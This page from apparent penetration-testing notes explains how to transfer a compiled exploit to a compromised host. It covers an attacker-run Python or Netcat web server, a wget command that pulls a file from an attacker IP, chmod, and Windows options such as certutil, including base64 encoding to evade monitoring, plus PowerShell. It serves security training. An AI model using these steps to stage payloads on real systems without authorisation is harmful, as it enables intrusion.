===========================================
Transferring the exploit to the target host
===========================================

.. index::
   single: Transfert Exploit
   single: Exploitation; Transfert Exploit

.. contents::
    :depth: 3
    :backlinks: top

####

When you have to compile an exploit on the attack box you first have to transfer the compiled
exploit to the target host before you execute it. If you are lucky enough to have file transfer
services or applications, such as FTP or wget, available on the compromised host, you can use these
to transfer your compiled exploit. If you’re not so lucky and there are no file transfer tools
installed, you have to be more creative and transfer files using Netcat, PowerShell, VBScript or
:ref:`Meterpreter <ref_Meterpreter>`.

The most used technic for transfering an Exploit or payload to a target is to force the download
from the target it self.

####

-----------
Web Serveur
-----------

It is convinient to create a web server on the Pentest computer (kali ;p) from the same dir of the
playload and the local copy of the exploit.

    .. danger:: 
        
        **Do not** use use your built-in Apache webserver without properly securing it fisrt !

    * :ref:`Python - Web Server <ref_pyWebServer>`

        Python webserver is the safest, easiest and recommended way to serve exploits. In most
        situations this method is sufficient and offers all the functionality required to compromise
        a machines. 

        It is also a good option for transfering a file from the compromized machine for the data
        exfiltrating. However since Python is not installed by default on Windows Systems, the
        Python Web server is, most of the time, the preferd way for the UX system.

    * :ref:`Netcat - Web Server <ref_ncWebServer>`

####

-------------
Download tool
-------------

here are some tools able to download the file from this web server.

File Transfer - All OS
======================

    * web browser (all OS)

      Trougth a site allowing upload or trougth a previous exploitation like a SQL Injection.

Linux File Transfert
====================


    * :ref:`wget <ref_wget>` (Linux, MacOS)

        .. note:: 
            
            **wget**
            
            .. code:: shell
                :number-lines:
                :force:

                 wget http://10.255.247.30/49402.txt

            **Cient side**

            .. image:: images/reqWget.png
                :width: 540 px
                :align: center

    .. note:: 
        
        **Make it executable**

        After transfering the exploit to the victim, you must change the permission type to make it
        executable for the current user.
        
        .. code:: shell
            :number-lines:
            :force:

             chmod 775 [filename]



Windows File Transfer
=====================

File transfers on Windows machines are a little harder to achieve from the command line as Windows
systems do not have a native tool like wget. Nevertheless, we have several other options that
generally come down to the use of built-in programs that we can use to transfers files such as 
**certutil.exe** and available scripting languages such as **VBScript** (Windows XP, Vista, 2003 and
earlier) or **PowerShell** (Windows 7 and later). 

The easiest way to transfer such scripts to the remote host is to build them directly on the target
line by line using a command-line shell.

    * :ref:`Certutil.exe <ref_Certutil>`

        Certutil is a trusted, pre-installed system tool with ‘extra’ unexpected functionality, 
        such as downloading files.
        
        An interesting feature of certutil is the option to download a remote certificate from a
        remote URL and save it to the local file system. While this feature is intended to download
        certificate files, **it can also be used to download non-certificate files with one simple
        command, including scripts and executables**.
        
        This feature is heavily utilized in campaigns to download malware which **can even bypass
        security programs and monitoring by base64 encoding the malicious file and decoding it after
        it has been downloaded to the system**.

    * :ref:`Powershell File Transfert <_ref_psFileTransfert>`

        PowerShell scripting language offers multiple ways to download files from remote locations.

            - :ref:`Invoke-WebRequest <ref_psWget>`
            - :ref:`System.Net.WebClient <ref_sysNetWebClient>`
            - :ref:`Start-BitsTransfert <ref_Start-BitsTransfert>`


    * :ref:`VBSript <ref_VBSript>`

        VBScript is outdated and support has been discontinued. You may prefer to use PowerShell.


####

--------
Weblinks
--------

.. target-notes::